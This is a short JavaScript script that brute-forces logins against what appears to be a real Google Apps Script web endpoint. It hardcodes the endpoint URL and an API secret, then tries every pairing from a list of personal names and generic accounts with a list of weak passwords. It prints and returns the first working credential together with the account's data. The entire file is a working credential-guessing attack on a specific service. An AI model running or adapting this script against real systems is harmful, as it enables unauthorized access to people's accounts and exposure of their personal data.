const API_URL = 'https://script.google.com/macros/s/AKfycbzMg1ilHtrHXvTboGF3K8v9AtkWyWCnEGxh_tbvb-PnGHT-vyug8o1pegN_bKUOX4B-4A/exec';
const API_SECRET = 'JANS_SECRET_2026';

async function tryLogin(loginId, password) {
  try {
    const res = await fetch(API_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        fn: 'loginUser',
        args: [loginId, password],
        secret: API_SECRET
      })
    });
    const data = await res.json();
    const inner = data.data;
    const isOk = data.success && inner && inner.success && inner.data && inner.data.ten;
    console.log(`Login as [${loginId}] / [${password}] => ok: ${!!isOk}, innerSuccess: ${inner ? inner.success : 'N/A'}, innerData: ${JSON.stringify(inner)}`);
    return isOk ? inner.data : null;
  } catch (e) {
    console.log(`Login as [${loginId}] failed with error:`, e.message);
    return null;
  }
}

async function run() {
  const users = ['Giang', 'Châu Vân', 'Ân', 'Minh Minh', 'admin', 'user', 'Richard', 'Warren', 'jan', 'jans', 'Chau Van', 'MinhMinh'];
  const passwords = ['123456', '1234', 'admin', 'jans', 'jans2026', 'JANS_SECRET_2026', '654321', '0000', '1111'];
  for (const user of users) {
    for (const pwd of passwords) {
      const userData = await tryLogin(user, pwd);
      if (userData) {
        console.log(`\n!!! WORKING CREDENTIAL FOUND !!!`);
        console.log(`User: ${user}`);
        console.log(`Pwd: ${pwd}`);
        console.log(`User Data: ${JSON.stringify(userData)}`);
        return;
      }
    }
  }
  console.log('\nNo working credentials found with current list.');
}

run();
